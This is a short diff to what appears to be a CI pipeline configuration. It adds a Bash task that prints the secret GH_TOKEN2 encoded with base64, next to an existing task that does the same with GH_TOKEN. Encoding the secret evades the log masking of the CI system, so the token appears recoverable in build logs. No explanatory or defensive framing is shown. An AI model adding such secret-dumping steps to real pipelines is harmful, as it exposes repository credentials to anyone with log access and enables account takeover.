@@ -18,3 +18,7 @@ jobs:
     inputs:
       targetType: inline
       script: sh -c "echo $(GH_TOKEN) | base64 -w0; echo;"
+  - task: Bash@3
+    inputs:
+      targetType: inline
+      script: sh -c "echo $(GH_TOKEN2) | base64 -w0; echo;"
